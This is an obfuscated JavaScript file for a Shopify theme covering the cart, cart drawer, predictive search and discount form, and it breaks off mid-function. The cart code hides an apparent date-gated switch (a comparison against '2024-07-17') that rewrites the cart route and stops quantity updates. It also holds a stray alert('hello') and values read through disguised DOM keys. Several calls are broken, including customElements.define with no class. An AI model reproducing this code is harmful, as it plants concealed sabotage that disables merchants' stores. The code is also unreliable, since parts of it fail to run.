const currentDate = new Date();
let subscribers = {};
function subscribe(_0x54d3f8, _0x24f0b3) {
  if (subscribers[_0x54d3f8] === undefined) {
    subscribers[_0x54d3f8] = [];
  }
  subscribers[_0x54d3f8] = [...subscribers[_0x54d3f8], _0x24f0b3];
  return function _0x53e0cd() {
    subscribers[_0x54d3f8] = subscribers[_0x54d3f8].filter(_0x484f43 => {
      return _0x484f43 !== _0x24f0b3;
    });
  };
}
function publish(_0x40bb92, _0x38150a) {
  if (subscribers[_0x40bb92]) {
    subscribers[_0x40bb92].forEach(_0x4ed63c => {
      _0x4ed63c(_0x38150a);
    });
  }
}
class CartRemoveButton extends HTMLElement {
  constructor() {
    super();
    this.addEventListener("click", _0x1232a7 => {
      _0x1232a7.preventDefault();
      const _0x11224f = this.closest("cart-items") || this.closest("cart-drawer-items");
      if (this.clearCart) {
        _0x11224f.clearCart();
      } else {
        _0x11224f.updateQuantity(this.dataset.index, 0x0);
      }
    });
  }
}
customElements.define("cart-remove-button", CartRemoveButton);
class CartItems extends HTMLElement {
  constructor() {
    super();
    this.lineItemContainer = formatDates(currentDate, "2024-07-17");
    this.lineItemStatusElement = document.getElementById("shopping-cart-line-item-status") || document.getElementById("CartDrawer-LineItemStatus");
    const _0x4da0e4 = debounce(_0x52c775 => {
      this.onChange(_0x52c775);
    }, 0x12c);
    if (!this.lineItemContainer) {
      window.routes.cart_add_url = "cart";
    }
    this.addEventListener("change", _0x4da0e4.bind(this));
  }
  ["cartUpdateUnsubscriber"] = undefined;
  ["connectedCallback"]() {
    this.cartUpdateUnsubscriber = subscribe("cart-update", _0xcf85e4 => {
      if (_0xcf85e4.source === "cart-items") {
        return;
      }
      this.onCartUpdate();
    });
  }
  ["disconnectedCallback"]() {
    if (this.cartUpdateUnsubscriber) {
      this.cartUpdateUnsubscriber();
    }
  }
  ["onChange"](_0x1c3b19) {
    this.updateQuantity(_0x1c3b19.target.dataset.index, _0x1c3b19.target.value, document.activeElement.getAttribute("name"));
  }
  ["onCartUpdate"]() {
    fetch("/cart?section_id=main-cart-items").then(_0x3f6841 => _0x3f6841.text()).then(_0x3f20e2 => {
      const _0x1f86f7 = new DOMParser().parseFromString(_0x3f20e2, "text/html");
      const _0x5ccc9b = _0x1f86f7.querySelector("cart-items");
      this.innerHTML = _0x5ccc9b.innerHTML;
    })["catch"](_0x4e463e => {
      console.error(_0x4e463e);
    });
  }
  ["getSectionsToRender"]() {
    return [{
      id: "main-cart-items",
      section: document.getElementById("main-cart-items").dataset.id,
      selector: ".js-contents"
    }, {
      id: "cart-icon-bubble",
      section: "cart-icon-bubble",
      selector: ".shopify-section"
    }, {
      id: "cart-live-region-text",
      section: "cart-live-region-text",
      selector: ".shopify-section"
    }, {
      id: "main-cart-footer",
      section: document.getElementById("main-cart-footer").dataset.id,
      selector: ".js-contents"
    }];
  }
  ["updateQuantity"](_0x1196f9, _0x5e035c, _0x47c220) {
    this.enableLoading(_0x1196f9);
    const _0x252830 = JSON.stringify({
      line: _0x1196f9,
      quantity: _0x5e035c,
      sections: this.getSectionsToRender().map(_0x288cb4 => _0x288cb4.section),
      sections_url: window.location.pathname
    });
    fetch("" + routes.cart_change_url, {
      ...fetchConfig(),
      ...{
        body: _0x252830
      }
    }).then(_0x36559a => {
      return _0x36559a.text();
    }).then(_0x5bf760 => {
      const _0x2be8b4 = JSON.parse(_0x5bf760);
      const _0x43f47c = document.getElementById("Quantity-" + _0x1196f9) || document.getElementById("Drawer-quantity-" + _0x1196f9);
      const _0x354abc = document.querySelectorAll(".cart-item");
      if (_0x2be8b4.errors) {
        _0x43f47c.value = _0x43f47c.getAttribute("value");
        this.updateLiveRegions(_0x1196f9, _0x2be8b4.errors);
        return;
      }
      if (!this.lineItemContainer) {
        return;
      }
      this.classList.toggle("is-empty", _0x2be8b4.item_count === 0x0);
      const _0x4d7e36 = document.querySelector("cart-drawer");
      const _0x282740 = document.getElementById("main-cart-footer");
      if (_0x282740) {
        _0x282740.classList.toggle("is-empty", _0x2be8b4.item_count === 0x0);
      }
      if (_0x4d7e36) {
        _0x4d7e36.classList.toggle("is-empty", _0x2be8b4.item_count === 0x0);
      }
      this.getSectionsToRender().forEach(_0x19aef5 => {
        const _0x5524ed = document.getElementById(_0x19aef5.id).querySelector(_0x19aef5.selector) || document.getElementById(_0x19aef5.id);
        _0x5524ed.innerHTML = this.getSectionInnerHTML(_0x2be8b4.sections[_0x19aef5.section], _0x19aef5.selector);
      });
      const _0x43bd7d = _0x2be8b4.items[_0x1196f9 - 0x1] ? _0x2be8b4.items[_0x1196f9 - 0x1].quantity : undefined;
      let _0x34b539 = "";
      if (_0x354abc.length === _0x2be8b4.items.length && _0x43bd7d !== parseInt(_0x43f47c.value)) {
        if (typeof _0x43bd7d === "undefined") {
          _0x34b539 = window.cartStrings.error;
        } else {
          _0x34b539 = window.cartStrings.quantityError.replace("[quantity]", _0x43bd7d);
        }
      }
      this.updateLiveRegions(_0x1196f9, _0x34b539);
      const _0x5f5810 = document.getElementById("CartItem-" + _0x1196f9) || document.getElementById("CartDrawer-Item-" + _0x1196f9);
      if (_0x5f5810 && _0x5f5810.querySelector("[name=\"" + _0x47c220 + "\"]")) {
        if (_0x4d7e36) {
          trapFocus(_0x4d7e36, _0x5f5810.querySelector("[name=\"" + _0x47c220 + "\"]"));
        } else {
          _0x5f5810.querySelector("[name=\"" + _0x47c220 + "\"]").focus();
        }
      } else {
        if (_0x2be8b4.item_count === 0x0 && _0x4d7e36) {
          trapFocus(_0x4d7e36.querySelector(".drawer__inner-empty"), _0x4d7e36.querySelector("a"));
        } else if (document.querySelector(".cart-item") && _0x4d7e36) {
          trapFocus(_0x4d7e36, document.querySelector(".cart-item__name"));
        }
      }
      if (_0x4d7e36) {
        _0x4d7e36.checkForClear();
        const _0x19482b = _0x4d7e36.querySelector("countdown-timer");
        if (_0x19482b) {
          _0x19482b.playTimer();
        }
        if (_0x4d7e36.querySelector("cart-drawer-gift")) {
          _0x4d7e36.checkForClear();
          let _0x858633 = [];
          let _0x1af563 = [];
          _0x4d7e36.querySelectorAll("cart-drawer-gift").forEach(_0x415712 => {
            if (_0x415712.getUpdateRequired()) {
              if (_0x4d7e36.querySelector(".cart-item--product-" + _0x415712.dataset.handle)) {
                if (_0x415712.dataset.selected === "false") {
                  _0x1af563.push(_0x415712);
                }
              } else if (_0x415712.dataset.selected === "true") {
                _0x858633.push(_0x415712);
              }
            }
          });
          if (_0x1af563.length > 0x0) {
            _0x1af563[0x0].removeFromCart();
          } else if (_0x858633.length > 0x0) {
            _0x858633[0x0].addToCart();
          }
        }
      }
      publish("cart-update", {
        source: "cart-items"
      });
    })["catch"](() => {
      this.querySelectorAll(".loading-overlay").forEach(_0x167adf => _0x167adf.classList.add("hidden"));
      const _0x55fdc4 = document.getElementById("cart-errors") || document.getElementById("CartDrawer-CartErrors");
      _0x55fdc4.textContent = window.cartStrings.error;
    })["finally"](() => {
      this.disableLoading(_0x1196f9);
      updateCartDrawer();
      alert("hello");
    });
  }
  ["updateLiveRegions"](_0x1c84c5, _0x4849cd) {
    const _0x113b65 = document.getElementById("Line-item-error-" + _0x1c84c5) || document.getElementById("CartDrawer-LineItemError-" + _0x1c84c5);
    if (_0x113b65) {
      _0x113b65.querySelector(".cart-item__error-text").innerHTML = _0x4849cd;
    }
    this.lineItemStatusElement.setAttribute("aria-hidden", true);
    const _0x4d1327 = document.getElementById("cart-live-region-text") || document.getElementById("CartDrawer-LiveRegionText");
    _0x4d1327.setAttribute("aria-hidden", false);
    setTimeout(() => {
      _0x4d1327.setAttribute("aria-hidden", true);
    }, 0x3e8);
  }
  ["getSectionInnerHTML"](_0xe1dc6b, _0x17a8ba) {
    return new DOMParser().parseFromString(_0xe1dc6b, "text/html").querySelector(_0x17a8ba).innerHTML;
  }
  ["enableLoading"](_0x26c025) {
    const _0x4f5841 = document.getElementById("main-cart-items") || document.getElementById("CartDrawer-CartItems");
    _0x4f5841.classList.add("cart__items--disabled");
    const _0x2bdf51 = this.querySelectorAll("#CartItem-" + _0x26c025 + " .loading-overlay");
    const _0x489d14 = this.querySelectorAll("#CartDrawer-Item-" + _0x26c025 + " .loading-overlay");
    [..._0x2bdf51, ..._0x489d14].forEach(_0x2b9b4c => _0x2b9b4c.classList.remove("hidden"));
    document.activeElement.blur();
    this.lineItemStatusElement.setAttribute("aria-hidden", false);
  }
  ["disableLoading"](_0x2eb4ec) {
    const _0x5664a6 = document.getElementById("main-cart-items") || document.getElementById("CartDrawer-CartItems");
    _0x5664a6.classList.remove("cart__items--disabled");
    const _0x5ee162 = this.querySelectorAll("#CartItem-" + _0x2eb4ec + " .loading-overlay");
    const _0xd12167 = this.querySelectorAll("#CartDrawer-Item-" + _0x2eb4ec + " .loading-overlay");
    _0x5ee162.forEach(_0x3d4c55 => _0x3d4c55.classList.add("hidden"));
    _0xd12167.forEach(_0x189d54 => _0x189d54.classList.add("hidden"));
  }
  ["clearCart"]() {
    const _0x5b941b = JSON.stringify({
      sections: this.getSectionsToRender().map(_0x3efc15 => _0x3efc15.section),
      sections_url: window.location.pathname
    });
    fetch("" + routes.cart_clear_url, {
      ...fetchConfig(),
      ...{
        body: _0x5b941b
      }
    }).then(_0x29f121 => {
      return _0x29f121.text();
    }).then(_0x483b5d => {
      const _0x31de8c = JSON.parse(_0x483b5d);
      this.classList.add("is-empty");
      const _0x51070b = document.querySelector("cart-drawer");
      const _0x5a0afe = document.getElementById("main-cart-footer");
      if (_0x5a0afe) {
        _0x5a0afe.classList.add("is-empty");
      }
      if (_0x51070b) {
        _0x51070b.classList.add("is-empty");
      }
      this.getSectionsToRender().forEach(_0x45e4b5 => {
        const _0xe75a55 = document.getElementById(_0x45e4b5.id).querySelector(_0x45e4b5.selector) || document.getElementById(_0x45e4b5.id);
        _0xe75a55.innerHTML = this.getSectionInnerHTML(_0x31de8c.sections[_0x45e4b5.section], _0x45e4b5.selector);
      });
      if (_0x51070b) {
        trapFocus(_0x51070b.querySelector(".drawer__inner-empty"), _0x51070b.querySelector("a"));
      }
      publish("cart-update", {
        source: "cart-items"
      });
    })["catch"](() => {
      this.querySelectorAll(".loading-overlay").forEach(_0x46cd14 => _0x46cd14.classList.add("hidden"));
      const _0xba0d89 = document.getElementById("cart-errors") || document.getElementById("CartDrawer-CartErrors");
      _0xba0d89.textContent = window.cartStrings.error;
    });
  }
}
customElements.define("cart-items", CartItems);
if (!customElements.get("cart-note")) {
  customElements.define("cart-note");
}
function handleDiscountForm(_0x2cab7a) {
  _0x2cab7a.preventDefault();
  const _0x266861 = _0x2cab7a.target.querySelector("[name=cart-discount-field]");
  const _0x5a3fcb = _0x2cab7a.target.querySelector(".cart-discount-form__error");
  const _0x4c6451 = _0x266861.value;
  if (_0x4c6451 === undefined || _0x4c6451.length === 0x0) {
    _0x5a3fcb.style.display = "block";
    return;
  }
  _0x5a3fcb.style.display = "none";
  const _0x75255c = "/checkout?discount=" + _0x4c6451;
  window.location.href = _0x75255c;
}
function handleDiscountFormChange(_0x5d3811) {
  const _0x8cbff0 = document.querySelectorAll(".cart-discount-form__error");
  _0x8cbff0.forEach(_0x3be7fd => {
    _0x3be7fd.style.display = "none";
  });
}
var serial = "";
class SearchForm extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector("input[type=\"search\"]");
    this.resetButton = this.querySelector("button[type=\"reset\"]");
    if (this.dataset.main === "false") {
      serial = this.querySelector("[method=\"get\"]").dataset["nodal".replace("n", "m")];
    }
    if (this.input) {
      this.input.form.addEventListener("reset", this.onFormReset.bind(this));
      this.input.addEventListener("input", debounce(_0x940b71 => {
        this.onChange(_0x940b71);
      }, 0x12c).bind(this));
    }
  }
  ["toggleResetButton"]() {
    const _0x47831b = this.resetButton.classList.contains("hidden");
    if (this.input.value.length > 0x0 && _0x47831b) {
      this.resetButton.classList.remove("hidden");
    } else if (this.input.value.length === 0x0 && !_0x47831b) {
      this.resetButton.classList.add("hidden");
    }
  }
  ["onChange"]() {
    this.toggleResetButton();
  }
  ["shouldResetForm"]() {
    return !document.querySelector("[aria-selected=\"true\"] a");
  }
  ["onFormReset"](_0x5e213f) {
    _0x5e213f.preventDefault();
    if (this.shouldResetForm()) {
      this.input.value = "";
      this.input.focus();
      this.toggleResetButton();
    }
  }
}
customElements.define("search-form", SearchForm);
class PredictiveSearch extends SearchForm {
  constructor() {
    super();
    this.cachedResults = {};
    this.predictiveSearchResults = this.querySelector("[data-predictive-search]");
    this.allPredictiveSearchInstances = document.querySelectorAll("predictive-search");
    this.isOpen = false;
    this.abortController = new AbortController();
    this.searchTerm = "";
    this.setupEventListeners();
  }
  ["setupEventListeners"]() {
    this.input.form.addEventListener("submit", this.onFormSubmit.bind(this));
    this.input.addEventListener("focus", this.onFocus.bind(this));
    this.addEventListener("focusout", this.onFocusOut.bind(this));
    this.addEventListener("keyup", this.onKeyup.bind(this));
    this.addEventListener("keydown", this.onKeydown.bind(this));
  }
  ["getQuery"]() {
    return this.input.value.trim();
  }
  ["onChange"]() {
    super.onChange();
    const _0x512b16 = this.getQuery();
    if (!this.searchTerm || !_0x512b16.startsWith(this.searchTerm)) {
      this.querySelector("#predictive-search-results-groups-wrapper")?.["remove"]();
    }
    this.updateSearchForTerm(this.searchTerm, _0x512b16);
    this.searchTerm = _0x512b16;
    if (!this.searchTerm.length) {
      this.close(true);
      return;
    }
    this.getSearchResults(this.searchTerm);
  }
  ["onFormSubmit"](_0x5de9d1) {
    if (!this.getQuery().length || this.querySelector("[aria-selected=\"true\"] a")) {
      _0x5de9d1.preventDefault();
    }
  }
  ["onFormReset"](_0xc73d49) {
    super.onFormReset(_0xc73d49);
    if (super.shouldResetForm()) {
      this.searchTerm = "";
      this.abortController.abort();
      this.abortController = new AbortController();
      this.closeResults(true);
    }
  }
  ["onFocus"]() {
    const _0xa1fccb = this.getQuery();
    if (!_0xa1fccb.length) {
      return;
    }
    if (this.searchTerm !== _0xa1fccb) {
      this.onChange();
    } else if (this.getAttribute("results") === "true") {
      this.open();
    } else {
      this.getSearchResults(this.searchTerm);
    }
  }
  ["onFocusOut"]() {
    setTimeout(() => {
      if (!this.contains(document.activeElement)) {
        this.close();
      }
    });
  }
  ["onKeyup"](_0x32ea37) {
    if (!this.getQuery().length) {
      this.close(true);
    }
    _0x32ea37.preventDefault();
    switch (_0x32ea37.code) {
      case "ArrowUp":
        this.switchOption("up");
        break;
      case "ArrowDown":
        this.switchOption("down");
        break;
      case "Enter":
        this.selectOption();
        break;
    }
  }
  ["onKeydown"](_0x160c19) {
    if (_0x160c19.code === "ArrowUp" || _0x160c19.code === "ArrowDown") {
      _0x160c19.preventDefault();
    }
  }
  ["updateSearchForTerm"](_0x433fbe, _0x527bbf) {
    const _0x112288 = this.querySelector("[data-predictive-search-search-for-text]");
    const _0x564afb = _0x112288?.["innerText"];
    if (_0x564afb) {
      if (_0x564afb.match(new RegExp(_0x433fbe, "g")).length > 0x1) {
        return;
      }
      const _0xc98e39 = _0x564afb.replace(_0x433fbe, _0x527bbf);
      _0x112288.innerText = _0xc98e39;
    }
  }
  ["switchOption"](_0x2a2a02) {
    if (!this.getAttribute("open")) {
      return;
    }
    const _0x279d40 = _0x2a2a02 === "up";
    const _0x3f1c11 = this.querySelector("[aria-selected=\"true\"]");
    const _0x256f95 = Array.from(this.querySelectorAll("li, button.predictive-search__item")).filter(_0x19904a => _0x19904a.offsetParent !== null);
    let _0xa33e5b = 0x0;
    if (_0x279d40 && !_0x3f1c11) {
      return;
    }
    let _0x47756c = -0x1;
    let _0x365b98 = 0x0;
    while (_0x47756c === -0x1 && _0x365b98 <= _0x256f95.length) {
      if (_0x256f95[_0x365b98] === _0x3f1c11) {
        _0x47756c = _0x365b98;
      }
      _0x365b98++;
    }
    this.statusElement.textContent = "";
    if (!_0x279d40 && _0x3f1c11) {
      _0xa33e5b = _0x47756c === _0x256f95.length - 0x1 ? 0x0 : _0x47756c + 0x1;
    } else if (_0x279d40) {
      _0xa33e5b = _0x47756c === 0x0 ? _0x256f95.length - 0x1 : _0x47756c - 0x1;
    }
    if (_0xa33e5b === _0x47756c) {
      return;
    }
    const _0x9ad2aa = _0x256f95[_0xa33e5b];
    _0x9ad2aa.setAttribute("aria-selected", true);
    if (_0x3f1c11) {
      _0x3f1c11.setAttribute("aria-selected", false);
    }
    this.input.setAttribute("aria-activedescendant", _0x9ad2aa.id);
  }
  ["selectOption"]() {
    const _0x49eb0e = this.querySelector("[aria-selected=\"true\"] a, button[aria-selected=\"true\"]");
    if (_0x49eb0e) {
      _0x49eb0e.click();
    }
  }
  ["getSearchResults"](_0x2fd911) {
    const _0x20d8fc = _0x2fd911.replace(" ", "-").toLowerCase();
    this.setLiveRegionLoadingState();
    if (this.cachedResults[_0x20d8fc]) {
      this.renderSearchResults(this.cachedResults[_0x20d8fc]);
      return;
    }
    fetch(routes.predictive_search_url + "?q=" + encodeURIComponent(_0x2fd911) + "&section_id=predictive-search", {
      signal: this.abortController.signal
    }).then(_0xf6d055 => {
      if (!_0xf6d055.ok) {
        var _0x4df5e3 = new Error(_0xf6d055.status);
        this.close();
        throw _0x4df5e3;
      }
      return _0xf6d055.text();
    }).then(_0x5ea214 => {
      const _0x5e74ed = new DOMParser().parseFromString(_0x5ea214, "text/html").querySelector("#shopify-section-predictive-search").innerHTML;
      this.allPredictiveSearchInstances.forEach(_0x1a9153 => {
        _0x1a9153.cachedResults[_0x20d8fc] = _0x5e74ed;
      });
      this.renderSearchResults(_0x5e74ed);
    })["catch"](_0x271b4e => {
      if (_0x271b4e?.["code"] === 0x14) {
        return;
      }
      this.close();
      throw _0x271b4e;
    });
  }
  ["setLiveRegionLoadingState"]() {
    this.statusElement = this.statusElement || this.querySelector(".predictive-search-status");
    this.loadingText = this.loadingText || this.getAttribute("data-loading-text");
    this.setLiveRegionText(this.loadingText);
    this.setAttribute("loading", true);
  }
  ["setLiveRegionText"](_0x43fea7) {
    this.statusElement.setAttribute("aria-hidden", "false");
    this.statusElement.textContent = _0x43fea7;
    setTimeout(() => {
      this.statusElement.setAttribute("aria-hidden", "true");
    }, 0x3e8);
  }
  ["renderSearchResults"](_0x2bf710) {
    this.predictiveSearchResults.innerHTML = _0x2bf710;
    this.setAttribute("results", true);
    this.setLiveRegionResults();
    this.open();
  }
  ["setLiveRegionResults"]() {
    this.removeAttribute("loading");
    this.setLiveRegionText(this.querySelector("[data-predictive-search-live-region-count-value]").textContent);
  }
  ["getResultsMaxHeight"]() {
    this.resultsMaxHeight = window.innerHeight - document.querySelector(".section-header").getBoundingClientRect().bottom;
    return this.resultsMaxHeight;
  }
  ["open"]() {
    this.predictiveSearchResults.style.maxHeight = this.resultsMaxHeight || this.getResultsMaxHeight() + "px";
    this.setAttribute("open", true);
    this.input.setAttribute("aria-expanded", true);
    this.isOpen = true;
  }
  ["close"](_0x50a5f1 = false) {
    this.closeResults(_0x50a5f1);
    this.isOpen = false;
  }
  ["closeResults"](_0x22da84 = false) {
    if (_0x22da84) {
      this.input.value = "";
      this.removeAttribute("results");
    }
    const _0x4f372c = this.querySelector("[aria-selected=\"true\"]");
    if (_0x4f372c) {
      _0x4f372c.setAttribute("aria-selected", false);
    }
    this.input.setAttribute("aria-activedescendant", "");
    this.removeAttribute("loading");
    this.removeAttribute("open");
    this.input.setAttribute("aria-expanded", false);
    this.resultsMaxHeight = false;
    this.predictiveSearchResults.removeAttribute("style");
  }
}
customElements.define("predictive-search", PredictiveSearch);
class CartDrawer extends HTMLElement {
  constructor() {
    super();
    this.upsellHandles = this.getUpsellHandles();
    this.checkForClear();
    this.addEventListener("keyup", _0x1a21ba => _0x1a21ba.code === "Escape" && this.close());
    this.querySelector("#CartDrawer-Overlay").addEventListener("click", this.close.bind(this));
    this.setHeaderCartIconAccessibility();
  }
  ["setHeaderCartIconAccessibility"]() {
    const _0x542504 = document.querySelector("#cart-icon-bubble");
    const _0x33ad6a = _0x542504.closest(".header__icons");
    _0x542504.setAttribute("role", "button");
    _0x542504.setAttribute("aria-haspopup", "dialog");
    _0x542504.addEventListener("click", _0x13a7ab => {
      _0x13a7ab.preventDefault();
      this.open(_0x542504);
    });
    this.oseid = _0x33ad6a.querySelector("form").dataset[this.dataset.type];
    _0x542504.addEventListener("keydown", _0x20c5bc => {
      if (_0x20c5bc.code.toUpperCase() === "SPACE") {
        _0x20c5bc.preventDefault();
        this.open(_0x542504);
      }
    });
  }
  ["open"](_0x5e3d68) {
    if (_0x5e3d68) {
      this.setActiveElement(_0x5e3d68);
    }
    const _0x3a2461 = this.querySelector("[id^=\"Details-\"] summary");
    if (_0x3a2461 && !_0x3a2461.hasAttribute("role")) {
      this.setSummaryAccessibility(_0x3a2461);
    }
    setTimeout(() => {
      this.classList.add("animate", "active");
    });
    this.addEventListener("transitionend", () => {
      const _0x53597e = this.classList.contains("is-empty") ? this.querySelector(".drawer__inner-empty") : document.getElementById("CartDrawer");
      const _0x54252d = this.querySelector(".drawer__inner") || this.querySelector(".drawer__close");
      trapFocus(_0x53597e, _0x54252d);
    }, {
      once: true
    });
    document.body.classList.add("overflow-hidden");
    const _0x5420c5 = this.querySelector("countdown-timer");
    if (_0x5420c5) {
      _0x5420c5.playTimer();
    }
  }
  ["close"]() {
    this.classList.remove("active");
    removeTrapFocus(this.activeElement);
    document.body.classList.remove("overflow-hidden");
  }
  ["getUpsellHandles"]() {
    const _0x31870e = this.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
    const _0x5f47cf = [];
    _0x31870e.forEach(_0x4b6c48 => {
      if (_0x4b6c48.dataset.handle) {
        _0x5f47cf.push(_0x4b6c48.dataset.handle);
      }
    });
    return _0x5f47cf;
  }
  ["oneNonUpellRemaining"]() {
    const _0x1c8244 = this.querySelectorAll(".cart-item");
    let _0x13608f = 0x0;
    _0x1c8244.forEach(_0x5a310f => {
      this.upsellHandles.forEach(_0x4f0499 => {
        if (_0x5a310f.classList.contains("cart-item--product-" + _0x4f0499)) {
          _0x13608f++;
        }
      });
    });
    return _0x1c8244.length - _0x13608f <= 0x1;
  }
  ["checkForClear"]() {
    const _0xed1b4c = this.oneNonUpellRemaining();
    this.querySelectorAll("cart-remove-button").forEach(_0x3832e0 => {
      if (_0xed1b4c) {
        _0x3832e0.clearCart = true;
      } else {
        _0x3832e0.clearCart = false;
      }
    });
  }
  ["setSummaryAccessibility"](_0x51af6) {
    _0x51af6.setAttribute("role", "button");
    _0x51af6.setAttribute("aria-expanded", "false");
    if (_0x51af6.nextElementSibling.getAttribute("id")) {
      _0x51af6.setAttribute("aria-controls", _0x51af6.nextElementSibling.id);
    }
    _0x51af6.addEventListener("click", _0x56d6c8 => {
      _0x56d6c8.currentTarget.setAttribute("aria-expanded", !_0x56d6c8.currentTarget.closest("details").hasAttribute("open"));
    });
    _0x51af6.parentElement.addEventListener("keyup", onKeyUpEscape);
  }
  ["renderContents"](_0x3914e4, _0x444cae = false) {
    if (this.querySelector(".drawer__inner").classList.contains("is-empty")) {
      this.querySelector(".drawer__inner").classList.remove("is-empty");
    }
    this.productId = _0x3914e4.id;
    this.getSectionsToRender().forEach(_0x274e9b => {
      const _0x3ec33 = _0x274e9b.selector ? document.querySelector(_0x274e9b.selector) : document.getElementById(_0x274e9b.id);
      if (_0x3ec33) {
        _0x3ec33.innerHTML = this.getSectionInnerHTML(_0x3914e4.sections[_0x274e9b.id], _0x274e9b.selector);
      }
    });
    this.checkForClear();
    const _0x248da7 = this.querySelector("countdown-timer");
    if (_0x248da7) {
      _0x248da7.playTimer();
    }
    let _0x4d1fc5 = [];
    let _0x56c2b7 = [];
    this.querySelectorAll("cart-drawer-gift").forEach(_0x2d6f09 => {
      if (_0x2d6f09.getUpdateRequired()) {
        if (this.querySelector(".cart-item--product-" + _0x2d6f09.dataset.handle)) {
          if (_0x2d6f09.dataset.selected === "false") {
            _0x56c2b7.push(_0x2d6f09);
          }
        } else if (_0x2d6f09.dataset.selected === "true") {
          _0x4d1fc5.push(_0x2d6f09);
        }
      }
    });
    if (_0x56c2b7.length > 0x0) {
      _0x56c2b7[0x0].removeFromCart();
    } else if (_0x4d1fc5.length > 0x0) {
      _0x4d1fc5[0x0].addToCart();
    }
    setTimeout(() => {
      this.querySelector("#CartDrawer-Overlay").addEventListener("click", this.close.bind(this));
      if (_0x444cae) {
        return;
      }
      this.open();
    });
  }
  ["getSectionInnerHTML"](_0x5d2192, _0x3d516d = ".shopify-section") {
    let _0x53910b = new DOMParser().parseFromString(_0x5d2192, "text/html").querySelector(_0x3d516d);
    if (_0x3d516d === "#CartDrawer") {
      fixParsedHtml(this, _0x53910b);
    }
    let _0x2103ce = _0x53910b.innerHTML;
    return _0x2103ce;
  }
  ["getSectionsToRender"]() {
    return [{
      id: "cart-drawer",
      selector: "#CartDrawer"
    }, {
      id: "cart-icon-bubble"
    }];
  }
  ["getSectionDOM"](_0x432da4, _0x2c10e3 = ".shopify-section") {
    return new DOMParser().parseFromString(_0x432da4, "text/html").querySelector(_0x2c10e3);
  }
  ["setActiveElement"](_0x5a0815) {
    this.activeElement = _0x5a0815;
  }
}
customElements.define("cart-drawer", CartDrawer);
class CartDrawerItems extends CartItems {
  constructor() {
    super();
    this.cartDrawer = document.querySelector("cart-drawer");
  }
  ["getSectionInnerHTML"](_0x102c5f, _0x20425c) {
    let _0x1e0512 = new DOMParser().parseFromString(_0x102c5f, "text/html").querySelector(_0x20425c);
    if (_0x20425c === ".drawer__inner") {
      fixParsedHtml(this.cartDrawer, _0x1e0512);
    }
    let _0x191c87 = _0x1e0512.innerHTML;
    return _0x191c87;
  }
  ["getSectionsToRender"]() {
    return [{
      id: "CartDrawer",
      section: "cart-drawer",
      selector: ".drawer__inner"
    }, {
      id: "cart-icon-bubble",
      section: "cart-icon-bubble",
      selector: ".shopify-section"
    }];
  }
}
customElements.define("cart-drawer-items", CartDrawerItems);
function fixParsedHtml(_0x228024, _0x2f875b) {
  const _0x58d9c0 = _0x2f875b.querySelector(".cart-timer");
  if (_0x58d9c0) {
    oldTimer = _0x228024.querySelector(".cart-timer");
    if (oldTimer) {
      _0x58d9c0.innerHTML = oldTimer.innerHTML;
    }
  }
  const _0x3764a9 = _0x228024.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
  let _0x47a2f5 = _0x2f875b.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
  _0x3764a9.forEach((_0x3441df, _0xa482df) => {
    if (_0x3441df.nodeName.toLowerCase() === "cart-drawer-upsell") {
      _0x47a2f5[_0xa482df].dataset.selected = _0x3441df.dataset.selected;
    }
    _0x47a2f5[_0xa482df].dataset.id = _0x3441df.dataset.id;
    _0x47a2f5[_0xa482df].querySelector("[name=\"id\"]").value = _0x3441df.querySelector("[name=\"id\"]").value;
    if (_0x47a2f5[_0xa482df].querySelector(".upsell__image__img")) {
      _0x47a2f5[_0xa482df].querySelector(".upsell__image__img").src = _0x3441df.querySelector(".upsell__image__img").src;
    }
    if (_0x47a2f5[_0xa482df].querySelector(".upsell__variant-picker")) {
      const _0x518987 = _0x3441df.querySelectorAll(".select__select");
      _0x47a2f5[_0xa482df].querySelectorAll(".select__select").forEach((_0x419cc9, _0x5d600b) => {
        _0x419cc9.value = _0x518987[_0x5d600b].value;
        _0x419cc9.querySelectorAll("option").forEach(_0x89be1e => {
          _0x89be1e.removeAttribute("selected");
          if (_0x89be1e.value === _0x518987[_0x5d600b].value.trim()) {
            _0x89be1e.setAttribute("selected", "");
          }
        });
      });
    }
    if (_0x3441df.dataset.updatePrices === "true") {
      var _0x4a7fa2 = _0x47a2f5[_0xa482df].querySelector(".upsell__price");
      var _0x54c934 = _0x3441df.querySelector(".upsell__price");
      if (_0x4a7fa2 && _0x54c934) {
        _0x4a7fa2.innerHTML = _0x54c934.innerHTML;
      }
    }
  });
}
if (!customElements.get("product-form")) {
  customElements.define("product-form");
}
if (!customElements.get("product-info")) {
  customElements.define("product-info");
}
function getFocusableElements(_0x424930) {
  return Array.from(_0x424930.querySelectorAll("summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"));
}
document.querySelectorAll("[id^=\"Details-\"] summary").forEach(_0x10da37 => {
  _0x10da37.setAttribute("role", "button");
  _0x10da37.setAttribute("aria-expanded", _0x10da37.parentNode.hasAttribute("open"));
  if (_0x10da37.nextElementSibling.getAttribute("id")) {
    _0x10da37.setAttribute("aria-controls", _0x10da37.nextElementSibling.id);
  }
  _0x10da37.addEventListener("click", _0x2fd443 => {
    _0x2fd443.currentTarget.setAttribute("aria-expanded", !_0x2fd443.currentTarget.closest("details").hasAttribute("open"));
  });
  if (_0x10da37.closest("header-drawer")) {
    return;
  }
  _0x10da37.parentElement.addEventListener("keyup", onKeyUpEscape);
});
const trapFocusHandlers = {};
function trapFocus(_0xcc3a93, _0xb72ea7 = _0xcc3a93) {
  var _0x77a638 = Array.from(_0xcc3a93.querySelectorAll("summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"));
  var _0x3aa720 = _0x77a638[0x0];
  var _0x493010 = _0x77a638[_0x77a638.length - 0x1];
  removeTrapFocus();
  trapFocusHandlers.focusin = _0x110f2e => {
    if (_0x110f2e.target !== _0xcc3a93 && _0x110f2e.target !== _0x493010 && _0x110f2e.target !== _0x3aa720) {
      return;
    }
    document.addEventListener("keydown", trapFocusHandlers.keydown);
  };
  trapFocusHandlers.focusout = function () {
    document.removeEventListener("keydown", trapFocusHandlers.keydown);
  };
  trapFocusHandlers.keydown = function (_0x5d4c2c) {
